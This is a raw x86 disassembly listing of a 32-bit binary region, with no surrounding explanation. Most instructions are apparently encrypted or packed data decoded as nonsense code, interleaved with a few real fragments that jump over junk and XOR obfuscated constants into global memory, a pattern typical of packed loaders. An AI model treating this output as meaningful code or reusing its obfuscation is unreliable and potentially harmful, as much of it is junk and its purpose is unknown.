  40935a:	shr    DWORD PTR [ecx],1
  40935c:	pushf  
  40935d:	and    BYTE PTR [eax],ah
  40935f:	outs   dx,DWORD PTR ds:[esi]
  409360:	cld    
  409361:	jb     0x409386
  409363:	push   esi
  409364:	xor    BYTE PTR [ecx+0x5699d63c],ah
  40936a:	jnp    0x4093b6
  40936c:	outs   dx,BYTE PTR ds:[esi]
  40936d:	aaa    
  40936e:	add    DWORD PTR [edi+ecx*4+0x76],ebp
  409372:	(bad)  
  409373:	push   edx
  409374:	pop    ebp
  409375:	lahf   
  409376:	or     BYTE PTR [esi-0x24538231],bl
  40937c:	pop    esi
  40937d:	pop    ebp
  40937e:	and    ch,BYTE PTR ds:0x502571a1
  409384:	mov    ebx,0x2b122dce
  409389:	ficom  DWORD PTR [ecx+0x377473c2]
  40938f:	sub    al,0xb7
  409391:	ins    BYTE PTR es:[edi],dx
  409392:	ins    DWORD PTR es:[edi],dx
  409393:	mov    ah,0xfa
  409395:	imul   BYTE PTR [esi+0x10]
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	arpl   WORD PTR [esi-0x7a],sp
  4093b7:	arpl   ax,bx
  4093b9:	fnstsw WORD PTR [esi+0x7e]
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	mov    bh,bh
  4093c2:	xchg   ebp,eax
  4093c3:	adc    BYTE PTR [esi-0x1e653fbd],ah
  4093c9:	mov    ah,BYTE PTR [edx+eax*2-0x668d1f21]
  4093d0:	dec    ebp
  4093d1:	push   ds
  4093d2:	test   al,0x62
  4093d4:	and    DWORD PTR [ecx+eax*1-0xa985e18],0x95c21cea
  4093df:	ror    esp,cl
  4093e1:	jae    0x40943d
  4093e3:	sbb    edi,DWORD PTR [edi+0x61351b58]
  4093e9:	xlat   BYTE PTR ds:[ebx]
  4093ea:	mov    edi,0x9a3b9c1f
  4093ef:	mov    DWORD PTR [edi-0x21a2b139],ebx
  4093f5:	push   ds
  4093f6:	aam    0x64
  4093f8:	sub    bh,BYTE PTR ds:0xca8122df
  4093fe:	imul   eax,eax,0xdc7cfb8d
  409404:	mov    edx,0x9bef8905
  40940a:	shr    dh,1
  40940c:	out    0x7f,eax
  40940e:	add    esp,ebx
  409410:	jmp    0x4093fe
  409412:	jge    0x4093c1
  409414:	adc    DWORD PTR [ebx-0x13],ebp
  409417:	in     eax,dx
  409418:	in     al,0x56
  40941a:	jne    0x409454
  40941c:	pop    es
  40941d:	data16 (bad) 
  40941f:	jl     0x4093f1
  409421:	inc    esi
  409422:	enter  0x206e,0xdc
  409426:	xchg   BYTE PTR [ecx],dl
  409428:	mov    dl,0x67
  40942a:	std    
  40942b:	and    eax,0xe136664a
  409430:	aad    0xe8
  409432:	fs jmp 0x4093c0
  409435:	jmp    0x361b:0x9ef34564
  40943c:	std    
  40943d:	add    ebx,DWORD PTR [edx+0x1c]
  409440:	push   esp
  409441:	jg     0x40943e
  409443:	mov    eax,ds:0xc14de012
  409448:	mov    ds:0x853313f8,al
  40944d:	retf   0x67e1
  409450:	xor    eax,0xafbbb5e1
  409455:	mov    ebp,0x59454589
  40945a:	sahf   
  40945b:	(bad)  
  40945c:	xlat   BYTE PTR ds:[ebx]
  40945d:	mov    ds:0x7f85ce68,eax
  409462:	(bad)  
  409463:	repz inc esi
  409465:	call   0x818e:0xdd885325
  40946c:	in     eax,dx
  40946d:	and    ebx,DWORD PTR [ebx-0x80]
  409470:	and    BYTE PTR [ebx],ah
  409472:	adc    dl,BYTE PTR [ebp+0x2276a643]
  409478:	test   dl,al
  40947a:	xchg   ebx,eax
  40947b:	xlat   BYTE PTR ds:[ebx]
  40947c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40947d:	jb     0x409407
  40947f:	leave  
  409480:	test   DWORD PTR [ecx-0x7a],eax
  409483:	and    edx,ebx
  409485:	xor    eax,0xddcc9d06
  40948a:	push   esi
  40948b:	xchg   DWORD PTR [ecx+0x215075e9],ebx
  409491:	xor    bl,BYTE PTR [esi+ecx*2]
  409494:	push   esi
  409495:	fcmovbe st,st(1)
  409497:	out    0xa5,al
  409499:	aaa    
  40949a:	push   ecx
  40949b:	fcom   st(6)
  40949d:	daa    
  40949e:	and    DWORD PTR [ecx],eax
  4094a0:	cmp    bh,BYTE PTR [ecx-0x64aeb06f]
  4094a6:	jmp    0x2abd:0xd0e798e2
  4094ad:	sahf   
  4094ae:	leave  
  4094af:	cmp    ebp,0xffffffd5
  4094b2:	or     edi,DWORD PTR [edi+ebx*4]
  4094b5:	sbb    eax,0xded17e96
  4094ba:	xor    BYTE PTR [ebx-0x73290cbe],al
  4094c0:	sub    esi,DWORD PTR [ebx]
  4094c2:	lea    eax,[edx]
  4094c4:	daa    
  4094c5:	repnz sub dh,bl
  4094c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094c9:	iret   
  4094ca:	add    DWORD PTR [ecx-0x46],0xffffffb6
  4094ce:	daa    
  4094cf:	xchg   ecx,eax
  4094d0:	mov    ds,WORD PTR [edx-0x54]
  4094d3:	test   ebx,ecx
  4094d5:	inc    ecx
  4094d6:	lods   eax,DWORD PTR ds:[esi]
  4094d7:	add    ah,BYTE PTR ds:0xce44324e
  4094dd:	loop   0x40955d
  4094df:	pop    ds
  4094e0:	aam    0x57
  4094e2:	das    
  4094e3:	xchg   esi,eax
  4094e4:	inc    ebp
  4094e5:	fimul  WORD PTR [esi-0x428ec1ae]
  4094eb:	std    
  4094ec:	mov    esp,DWORD PTR [eax+ecx*4-0x25]
  4094f0:	mov    edx,0xce3310c3
  4094f5:	mov    edx,0x7ac80757
  4094fa:	xchg   esp,eax
  4094fb:	push   es
  4094fc:	mov    bh,0x22
  4094fe:	iret   
  4094ff:	loop   0x40956c
  409501:	jbe    0x4094a4
  409503:	add    al,0x51
  409505:	mov    eax,0xac789687
  40950a:	aam    0x7b
  40950c:	mov    DWORD PTR [ecx-0x57],esi
  40950f:	sar    DWORD PTR [edx+edi*2-0x9],0xfb
  409514:	mov    ebp,0x220e230e
  409519:	and    DWORD PTR [edi+0x56],eax
  40951c:	ss inc ecx
  40951e:	in     eax,dx
  40951f:	mov    dl,0xb
  409521:	aaa    
  409522:	pop    edx
  409523:	jecxz  0x409540
  409525:	retf   
  409526:	mov    edi,0x3294a4a0
  40952b:	rcr    BYTE PTR [esi+0x22c6899f],0xdb
  409532:	cmp    ebp,DWORD PTR [ecx]
  409534:	and    al,0x8b
  409536:	or     eax,0x49b1b053
  40953b:	xlat   BYTE PTR ds:[ebx]
  40953c:	enter  0x1708,0x3b
  409540:	mov    esp,0x94c3b055
  409545:	sbb    eax,0xe009daee
  40954a:	je     0x4094f6
  40954c:	inc    ebp
  40954d:	add    BYTE PTR [edx+0x629115b2],al
  409553:	out    0x54,eax
  409555:	xor    ebx,ebx
  409557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409558:	mov    dh,0xc5
  40955a:	jns    0x409548
  40955c:	sbb    ebp,DWORD PTR [eax+0x367134b0]
  409562:	or     al,0xa0
  409564:	imul   ecx,DWORD PTR cs:[ecx+0x41c9f947],0xff57ddfe
  40956f:	ret    0x966
  409572:	iret   
  409573:	fwait
  409574:	pop    esi
  409575:	outs   dx,DWORD PTR ds:[esi]
  409576:	sub    esi,DWORD PTR [eax+edi*2]
  409579:	fisubr DWORD PTR [ecx-0x22]
  40957c:	gs gs ret 
  40957f:	sbb    BYTE PTR [esi-0x60],bh
  409582:	fsubr  st,st(6)
  409584:	cmp    BYTE PTR [ecx+0x4378de06],dh
  40958a:	fwait
  40958b:	in     al,0x48
  40958d:	cmp    al,0xc2
  40958f:	mov    ebx,0xf4801165
  409594:	xchg   esi,eax
  409595:	(bad)  
  409596:	mov    al,0x12
  409598:	pusha  
  409599:	nop
  40959a:	clc    
  40959b:	pand   mm5,mm6
  40959e:	mov    al,0x8a
  4095a0:	dec    esp
  4095a1:	loop   0x4095c0
  4095a3:	shr    BYTE PTR ds:0xc26373b,1
  4095a9:	pop    ebx
  4095aa:	jne    0x40956a
  4095ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ad:	push   ds
  4095ae:	sub    DWORD PTR [ebx+ebp*1+0x1259f379],eax
  4095b5:	cs loop 0x4095a8
  4095b8:	push   ds
  4095b9:	xchg   esi,eax
  4095ba:	adc    DWORD PTR [ebp+0x30],edx
  4095bd:	scas   eax,DWORD PTR es:[edi]
  4095be:	nop
  4095bf:	push   ds
  4095c0:	outs   dx,BYTE PTR ds:[esi]
  4095c1:	jnp    0x40954c
  4095c3:	(bad)  
  4095c4:	and    ah,ah
  4095c6:	fcmovnbe st,st(6)
  4095c8:	inc    esp
  4095c9:	sub    edx,esp
  4095cb:	xchg   edi,edi
  4095cd:	ds data16 out 0xfd,al
  4095d1:	jbe    0x40955c
  4095d3:	retf   
  4095d4:	mov    ebx,0x8cb2bdcd
  4095d9:	outs   dx,DWORD PTR ds:[esi]
  4095da:	in     al,dx
  4095db:	stos   DWORD PTR es:[edi],eax
  4095dc:	in     al,0x5e
  4095de:	or     bl,dl
  4095e0:	xor    cl,BYTE PTR [ebp+edx*2-0x5d45112]
  4095e7:	lahf   
  4095e8:	mov    dl,0x6c
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e15:0x2969704e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	and    esi,edi
  40960e:	test   eax,0x97ff61c1
  409613:	(bad)  [ebx+0x2da4b505]
  409619:	cmp    BYTE PTR [ebp+0x4],0x76
  40961d:	dec    ebx
  40961e:	cld    
  40961f:	sti    
  409620:	mov    dh,0x29
  409623:	jno    0x409653
  409625:	xchg   edi,eax
  409626:	cmp    dh,BYTE PTR [eax+0x79]
  409629:	bswap  ebx
  40962b:	loopne 0x4095f9
  40962d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40962e:	xchg   eax,ebx
  409630:	lods   al,BYTE PTR ds:[esi]
  409631:	and    DWORD PTR [edi],esp
  409633:	dec    edi
  409634:	sbb    al,0x9c
  409636:	sub    BYTE PTR [edx-0x2cbeaae3],cl
  40963c:	push   ds
  40963d:	dec    eax
  40963e:	sbb    al,0x1c
  409640:	jbe    0x40963f
  409642:	mov    edx,0x27af3929
  409647:	mov    WORD PTR [ecx-0x7],ds
  40964a:	stos   DWORD PTR es:[edi],eax
  40964b:	mov    edi,DWORD PTR [edx+edx*4]
  40964e:	jecxz  0x409691
  409650:	cmp    eax,0x264756ee
  409655:	xchg   ch,bh
  409657:	mov    esi,DWORD PTR [edx+0x512eb2cb]
  40965d:	test   BYTE PTR es:[edx+0x2f643817],bh
  409664:	xlat   BYTE PTR ds:[ebx]
  409665:	mov    ah,0xc2
  409667:	inc    esi
  409668:	lock xor dh,BYTE PTR [edx-0x28]
  40966c:	clc    
  40966d:	sub    al,0x1d
  40966f:	sbb    ch,BYTE PTR [ebp+0x17a13f26]
  409675:	dec    edi
  409676:	inc    eax
  409677:	dec    edi
  409678:	add    esi,DWORD PTR [edi-0x5b]
  40967b:	shl    al,cl
  40967d:	bsr    edi,DWORD PTR [ebx+0x692501e9]
  409684:	mov    esp,0xea2475cb
  409689:	sub    al,0x14
  40968b:	stc    
  40968c:	call   0x1392:0xf3ecb099
  409693:	pop    ds
  409694:	repz jle 0x40961c
  409697:	or     ah,al
  409699:	xchg   edx,eax
  40969a:	fldenv [edx]
  40969c:	add    al,0x53
  40969e:	or     al,0x11
  4096a0:	lea    edx,[edx+ebx*1]
  4096a3:	ds out dx,al
  4096a5:	mov    esp,0x676f2f4c
  4096aa:	fwait
  4096ab:	cmp    al,0xf3
  4096ad:	mov    WORD PTR [ecx-0x48],?
  4096b0:	pop    edx
  4096b1:	pop    esp
  4096b2:	mov    dh,0xc7
  4096b4:	call   0xd1ac95d9
  4096b9:	out    dx,al
  4096ba:	std    
  4096bb:	mov    ds:0x8bd25fe1,al
  4096c0:	push   0xb7282735
  4096c5:	mov    ds:0x15c37f2c,al
  4096ca:	mov    eax,0x74d343b2
  4096cf:	cmp    esp,edx
  4096d1:	out    dx,al
  4096d2:	outs   dx,DWORD PTR ds:[esi]
  4096d3:	add    eax,0xc4c78b0d
  4096d8:	xchg   BYTE PTR [ebp+0x37],ah
  4096db:	aam    0x98
  4096dd:	les    esi,FWORD PTR [ebx]
  4096df:	mov    gs,esp
  4096e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096e2:	psadbw mm1,QWORD PTR [edx]
  4096e5:	pop    ds
  4096e6:	test   eax,0xed5eb7b8
  4096eb:	ror    BYTE PTR [ebx+ebp*4+0x61d6cb2c],1
  4096f2:	lea    ebx,[ebx-0xc]
  4096f5:	sub    DWORD PTR [eax],0xa10481cb
  4096fb:	lock mov ebp,0xc0276f80
  409701:	push   ebx
  409702:	push   edx
  409703:	call   0x10a9ae7c
  409708:	sub    eax,0xfb977156
  40970d:	sbb    BYTE PTR [edi+0x362d0a4c],bh
  409713:	add    dh,BYTE PTR [ebx+0x5023e357]
  409719:	dec    ecx
  40971a:	retf   
  40971b:	sbb    BYTE PTR [edi],dl
  40971d:	neg    BYTE PTR [ecx]
  40971f:	scas   eax,DWORD PTR es:[edi]
  409720:	sub    BYTE PTR [esi],dh
  409722:	push   ss
  409723:	add    BYTE PTR [edi],al
  409725:	mov    cl,bh
  409727:	add    BYTE PTR ds:0xb2b86c89,dh
  40972d:	mov    edx,0x47009b95
  409732:	mov    dh,0xed
  409734:	cmp    BYTE PTR [eax],cl
  409736:	pop    esi
  409737:	fiadd  WORD PTR [ecx-0x10197893]
  40973d:	mov    DWORD PTR [esi-0x2b],ebp
  409740:	cwde   
  409741:	xchg   ebx,eax
  409742:	sub    al,0x27
  409744:	add    cl,BYTE PTR [eax]
  409746:	dec    eax
  409747:	xlat   BYTE PTR ds:[ebx]
  409748:	int3   
  409749:	pop    ds
  40974a:	out    0x6d,eax
  40974c:	fsubr  DWORD PTR [edi-0x47]
  40974f:	test   eax,0x8abedeb2
  409754:	enter  0xa77d,0x68
  409758:	jns    0x409774
  40975a:	loope  0x4097ce
  40975c:	adc    BYTE PTR [ebx-0x30],dl
  40975f:	cs jle 0x4097a9
  409762:	mov    BYTE PTR [ebx+0x1c],ah
  409765:	fistp  DWORD PTR [edi-0x73]
  409768:	fild   QWORD PTR [esi]
  40976a:	fiadd  DWORD PTR gs:[ebx+0x25]
  40976e:	scas   eax,DWORD PTR es:[edi]
  40976f:	jmp    DWORD PTR [esi+0x11bded3b]
  409775:	jne    0x40974e
  409777:	pop    eax
  409778:	outs   dx,BYTE PTR ds:[esi]
  409779:	xor    al,0x72
  40977b:	xchg   esi,eax
  40977c:	mov    edi,gs
  40977e:	rcl    eax,cl
  409780:	or     eax,0xe079e731
  409785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409786:	arpl   WORD PTR [ecx+0xb014d62],di
  40978c:	mov    bh,0xa3
  40978e:	sub    DWORD PTR [ebp-0x2b],esp
  409791:	adc    bh,BYTE PTR [ebx-0x7e77b5dd]
  409797:	sub    al,0xaa
  409799:	nop
  40979a:	(bad)  
  40979b:	scas   eax,DWORD PTR es:[edi]
  40979c:	test   eax,0x24efe797
  4097a1:	aaa    
  4097a2:	adc    DWORD PTR [esi+0x309fc8a9],edx
  4097a8:	inc    edi
  4097a9:	retf   0x3787
  4097ac:	push   esp
  4097ad:	iret   
  4097ae:	into   
  4097af:	mov    ebx,DWORD PTR [ebp-0x47]
  4097b2:	dec    esp
  4097b3:	(bad)  
  4097b4:	adc    dl,BYTE PTR [ecx+0x60]
  4097b7:	push   ebp
  4097b8:	sbb    edi,edx
  4097ba:	rcl    BYTE PTR [ebp-0x5a1fb07f],0xb8
  4097c1:	sti    
  4097c2:	cmp    bl,BYTE PTR [edx-0x5]
  4097c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097c6:	sbb    DWORD PTR [edi],0xc
  4097c9:	bound  ebx,QWORD PTR [edx-0x65c09e72]
  4097cf:	daa    
  4097d0:	pop    ebx
  4097d1:	add    eax,0x7e1f37b4
  4097d6:	outs   dx,BYTE PTR ds:[esi]
  4097d7:	mov    eax,ds:0x18d9ac45
  4097dc:	xor    eax,ecx
  4097de:	mov    cl,0xd1
  4097e0:	sub    al,0xcc
  4097e2:	push   esp
  4097e3:	sub    ebx,edx
  4097e5:	in     al,0x92
  4097e7:	hlt    
  4097e8:	cli    
  4097e9:	add    BYTE PTR [eax-0x21cac09d],ch
  4097ef:	mov    fs,WORD PTR [edi-0x53]
  4097f2:	xor    esi,DWORD PTR [edx+edi*8+0x7b7ec13d]
  4097f9:	loope  0x4097ba
  4097fb:	xchg   ebp,eax
  4097fc:	sub    DWORD PTR [edx],ebp
  4097fe:	ins    BYTE PTR es:[edi],dx
  4097ff:	mov    ecx,0x5cd0aa25
  409804:	aas    
  409805:	sub    al,0xf1
  409807:	xlat   BYTE PTR ds:[ebx]
  409808:	shr    DWORD PTR [edx],1
  40980a:	dec    edx
  40980b:	xor    BYTE PTR [esi+eax*8],0x2b
  40980f:	imul   ecx,DWORD PTR ds:[edi+0x79],0x25
  409814:	jns    0x40982c
  409816:	xchg   ebx,eax
  409817:	sbb    BYTE PTR [edi+eax*8-0x5df8b363],ah
  40981e:	xchg   edx,eax
  40981f:	repnz mov ebx,eax
  409822:	xchg   ebp,eax
  409823:	push   ebp
  409824:	lock adc ch,al
  409827:	aam    0x5a
  409829:	(bad)  
  40982a:	xor    eax,0x78a1876a
  40982f:	addr16 jo 0x4097dc
  409832:	popf   
  409833:	lods   al,BYTE PTR ds:[esi]
  409834:	fwait
  409835:	(bad)  
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	inc    edx
  4098c1:	mov    eax,ds:0xd9b4d5a1
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	(bad)  
  4098cd:	push   ds
  4098ce:	mov    eax,ds:0x4ca4055c
  4098d3:	adc    esp,ecx
  4098d5:	into   
  4098d6:	mov    edi,0x5556b65a
  4098db:	out    dx,eax
  4098dc:	ret    0xf335
  4098df:	test   BYTE PTR [esi+0x4c],ah
  4098e2:	out    dx,al
  4098e3:	(bad)  
  4098e5:	popa   
  4098e6:	sub    DWORD PTR [ecx+0x443bed96],0xfffffff1
  4098ed:	repz sub al,0xff
  4098f0:	cmp    eax,0x9855bad0
  4098f5:	xchg   edi,eax
  4098f6:	stos   BYTE PTR es:[edi],al
  4098f7:	xchg   BYTE PTR [ecx],dh
  4098f9:	or     al,0xd9
  4098fb:	add    edx,DWORD PTR [edx+ebp*2]
  4098fe:	mov    BYTE PTR [edx-0x668a283b],bl
  409904:	jmp    0xe467:0x3b6aaeae
  40990b:	pop    esi
  40990c:	call   0xae44f93e
  409911:	pop    esp
  409912:	pushf  
  409913:	adc    al,0x5c
  409915:	rcl    DWORD PTR [edi+0x5c],1
  409918:	xor    edi,DWORD PTR [eax+0x6ba7f2d4]
  40991e:	dec    ebx
  40991f:	adc    ah,ah
  409921:	fcmove st,st(6)
  409923:	jg     0x409955
  409925:	loope  0x4098ed
  409927:	mov    bh,0x68
  409929:	pop    ecx
  40992a:	pop    edx
  40992b:	inc    edx
  40992c:	ret    
  40992d:	push   cs
  40992e:	rol    DWORD PTR ds:0xf3308e62,cl
  409934:	sub    eax,0x5607e0da
  409939:	and    ch,0x4
  40993c:	fwait
  40993d:	jg     0x4098e2
  40993f:	mov    bl,BYTE PTR [edx+edi*4-0x1b28ef3f]
  409946:	fwait
  409947:	add    DWORD PTR [eax],edx
  409949:	xchg   esp,eax
  40994a:	dec    DWORD PTR ds:[eax-0x6d752c7d]
  409951:	jnp    0x40995d
  409953:	xchg   esp,eax
  409954:	sar    DWORD PTR [eax],cl
  409956:	inc    eax
  409957:	in     eax,0xc1
  409959:	jne    0x409939
  40995b:	in     eax,dx
  40995c:	retf   
  40995d:	mov    esp,0xc06552ed
  409962:	and    DWORD PTR [edx-0x381f34a4],esi
  409968:	jmp    0xa9a298ce
  40996d:	clc    
  40996e:	ror    esi,cl
  409970:	jne    0x4099db
  409972:	push   cs
  409973:	push   edi
  409974:	ins    DWORD PTR es:[edi],dx
  409975:	in     al,0xd6
  409977:	test   al,0x8d
  409979:	inc    ebx
  40997a:	jns    0x409959
  40997c:	out    dx,al
  40997d:	lods   al,BYTE PTR ds:[esi]
  40997e:	fs pop eax
  409980:	sub    DWORD PTR [esi],esi
  409982:	js     0x4099f8
  409984:	shl    ebx,1
  409986:	aad    0xb6
  409988:	sbb    BYTE PTR [esi+ebp*8-0x7150938d],ch
  40998f:	sbb    ecx,0xc21ac3ea
  409995:	loopne 0x40997f
  409997:	lods   al,BYTE PTR ds:[esi]
  409998:	jbe    0x409a0a
  40999a:	push   ecx
  40999b:	mov    cs,WORD PTR ds:0x8ba763e6
  4099a1:	sub    eax,0x8b4dda30
  4099a6:	push   eax
  4099a7:	mov    DWORD PTR [edi+eax*8],esp
  4099aa:	push   0x71a9645e
  4099af:	je     0x40997b
  4099b1:	or     esi,ebx
  4099b3:	ret    
  4099b4:	lods   eax,DWORD PTR ds:[esi]
  4099b5:	lds    edi,FWORD PTR [edx-0x21673577]
  4099bb:	ins    BYTE PTR es:[edi],dx
  4099bc:	fld    st(7)
  4099be:	mov    cl,0x28
  4099c0:	xchg   DWORD PTR [edi-0x5f0f692c],edx
  4099c6:	stos   BYTE PTR es:[edi],al
  4099c7:	mov    ah,0xa
  4099ca:	test   eax,0x4bd8f1a2
  4099d0:	clc    
  4099d1:	push   ebp
  4099d2:	jge    0x409a09
  4099d4:	cmp    DWORD PTR ds:[edx+ebx*1+0x7320f8dd],0x1b0947aa
  4099e0:	ds popa 
  4099e2:	ja     0x40997b
  4099e4:	mov    ch,0x18
  4099e6:	pop    edx
  4099e7:	pop    ebx
  4099e8:	hlt    
  4099e9:	dec    esp
  4099ea:	fisub  WORD PTR [edx]
  4099ec:	mov    ebp,0x5d02b591
  4099f1:	pushf  
  4099f2:	add    eax,0x962c87d
  4099f7:	stos   DWORD PTR es:[edi],eax
  4099f8:	ja     0x409a6f
  4099fa:	jge    0x4099e4
  4099fc:	ror    DWORD PTR [edx],cl
  4099fe:	mov    eax,0x6200269c
  409a03:	gs sub cl,ch
  409a06:	ret    
  409a07:	sbb    BYTE PTR [ebp-0x1b16b2a3],bh
  409a0d:	mov    esi,edx
  409a0f:	sub    BYTE PTR [edx],cl
  409a11:	cmc    
  409a12:	dec    edi
  409a13:	push   edx
  409a14:	inc    esp
  409a15:	xchg   ecx,eax
  409a16:	inc    esi
  409a17:	cmp    DWORD PTR [ebp-0x391f46a5],eax
  409a1d:	adc    DWORD PTR [ebx-0x1bf96cb6],0x7cd43fb6
  409a27:	repz sbb DWORD PTR [edx+0x28f15c1f],ebp
  409a2e:	out    dx,eax
  409a2f:	and    cl,BYTE PTR [edi-0x4e]
  409a32:	out    dx,eax
  409a33:	pop    es
  409a34:	cmp    bh,dh
  409a36:	mov    BYTE PTR [edi+edx*2],al
  409a39:	imul   ecx,DWORD PTR [eax+0x51],0x21
  409a3d:	adc    eax,0x6ebea75
  409a42:	push   edx
  409a43:	ins    BYTE PTR es:[edi],dx
  409a44:	nop
  409a45:	aaa    
  409a46:	push   es
  409a47:	pop    es
  409a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a49:	data16 add al,0xf7
  409a4c:	add    dh,BYTE PTR [eax-0x49]
  409a4f:	adc    eax,0x213ad26
  409a54:	ja     0x409a84
  409a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a57:	jne    0x4099dd
  409a59:	xchg   ecx,eax
  409a5a:	sbb    eax,0x90273f42
  409a5f:	retf   0x1887
  409a62:	pop    es
  409a63:	sub    eax,0xf6461717
  409a68:	jmp    0x409a6d
  409a6a:	add    esi,DWORD PTR [esi+0x17]
  409a6d:	cmp    BYTE PTR ds:0x45f27f36,bl
  409a73:	or     ch,bl
  409a75:	jnp    0x409aaf
  409a77:	dec    edi
  409a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a79:	stos   DWORD PTR es:[edi],eax
  409a7a:	inc    edi
  409a7b:	int    0x86
  409a7d:	push   0xdcd5ec1c
  409a82:	into   
  409a83:	sbb    DWORD PTR [ebx+0xb],esp
  409a86:	mov    al,0xd9
  409a88:	call   0x2acde40a
  409a8d:	(bad)  
  409a8e:	mov    WORD PTR ds:0x5ceeec68,?
  409a94:	and    bl,bh
  409a96:	cdq    
  409a97:	sar    DWORD PTR [edi],0x35
  409a9a:	add    DWORD PTR [edx+0xb],0xa7a2572e
  409aa1:	or     al,0xfa
  409aa3:	mov    bl,0x4d
  409aa5:	adc    bh,BYTE PTR [ebx-0x38]
  409aa8:	push   ebx
  409aa9:	sub    DWORD PTR [edi-0x17107b0a],edi
  409aaf:	lea    esi,[edi]
  409ab1:	xchg   ebp,eax
  409ab2:	mov    bl,0xc
  409ab4:	inc    ecx
  409ab5:	mov    eax,ds:0xed52f275
  409aba:	jne    0x409a74
  409abc:	cli    
  409abd:	push   0xffffffa1
  409abf:	fidivr WORD PTR [esi+0x2f]
  409ac2:	jb     0x409a63
  409ac4:	dec    esp
  409ac5:	sub    esp,DWORD PTR [edx]
  409ac7:	sbb    DWORD PTR [edi+ebp*2+0x3fd72d83],esi
  409ace:	mov    al,BYTE PTR [ebx-0x22]
  409ad1:	inc    ecx
  409ad2:	push   ds
  409ad3:	loopne 0x409a8f
  409ad5:	pop    esi
  409ad6:	xchg   esi,eax
  409ad7:	mov    ds:0x2dd4f3d0,al
  409adc:	mov    ds:0x2969d46a,eax
  409ae1:	loop   0x409a6b
  409ae3:	xor    ah,dh
  409ae5:	push   esp
  409ae6:	inc    esi
  409ae7:	cmp    eax,0x79da5d35
  409aec:	jno    0x409a92
  409aee:	and    esp,DWORD PTR [edi-0x4545d707]
  409af4:	ror    BYTE PTR [ecx],0x8b
  409af7:	fstp   QWORD PTR [eiz*8-0x52bf0676]
  409afe:	es (bad) 
  409b00:	fidivr WORD PTR [edx+0x5c3853eb]
  409b06:	test   DWORD PTR [eax+0xcedaedf],esp
  409b0c:	add    dh,BYTE PTR ds:0x566e30be
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi-0x10683d2c]
  409b32:	xor    eax,0x7e7ee47e
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	sub    BYTE PTR [ebx],0x7c
  409b3e:	adc    al,0x45
  409b40:	ret    
  409b41:	inc    edi
  409b42:	stos   BYTE PTR es:[edi],al
  409b43:	and    eax,0x7c99a5cf
  409b48:	inc    edi
  409b49:	test   BYTE PTR [ecx-0x4a],0xf2
  409b4d:	inc    ebx
  409b4e:	or     al,0x5e
  409b50:	ret    0xb024
  409b53:	push   edi
  409b54:	and    edi,ecx
  409b56:	push   ebp
  409b57:	out    dx,al
  409b58:	sbb    cl,0x9a
  409b5b:	and    BYTE PTR [ecx],dl
  409b5d:	sub    al,0x95
  409b5f:	mov    dh,bl
  409b61:	fdivrp st(5),st
  409b63:	aam    0x9a
  409b65:	retf   0x5a04
  409b68:	test   eax,0x21a96a28
  409b6d:	or     eax,0x34a40fa9
  409b72:	inc    esp
  409b73:	aaa    
  409b74:	popa   
  409b75:	ins    BYTE PTR es:[edi],dx
  409b76:	retf   0xa0fb
